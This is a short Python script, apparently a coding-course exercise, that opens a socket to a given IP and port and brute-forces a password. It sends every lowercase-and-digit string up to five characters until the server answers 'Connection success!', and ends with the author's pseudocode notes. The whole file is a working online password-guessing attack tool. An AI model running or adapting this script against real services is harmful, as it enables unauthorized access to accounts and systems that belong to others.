import argparse
import socket
import itertools
import string

parser = argparse.ArgumentParser(description="suppa hackka")
parser.add_argument('ip',  help='ip address', type=str)
parser.add_argument('port',  help='port', type=int)
args = parser.parse_args()

client = socket.socket()
client.connect((args.ip, args.port))


def send_response(msg: str):
    """accepts message as arg, sends it to server, returns server message"""
    client.send(msg.encode())
    return client.recv(1024).decode()

n_rep = 1
found = None
while n_rep < 6 and not found:
    cart_p = itertools.product(string.ascii_lowercase+string.digits, repeat=n_rep)
    try:
        while True:
            passwd = ''.join(next(cart_p))
            if send_response(passwd) == 'Connection success!':
                found = True
                print(passwd)
                break
    except StopIteration:
        n_rep += 1

'''

StopIteration happens when an iterable object is exhastued, 
ie. you've looped through the whole thing.

repeat should be apparently till 5
so that means
a, b, ... z, 1, 2, ... 9
aa, ... 99, 


while n_rep <= 5:
    a = itertools.product(alphabets+digits, repeat=n_rep)
    try:
        while True:
            next(a)
            send this to server
            if server accepts, break the loops
    except StopIteration: 
        pass
        n_rep++


'''

client.close()
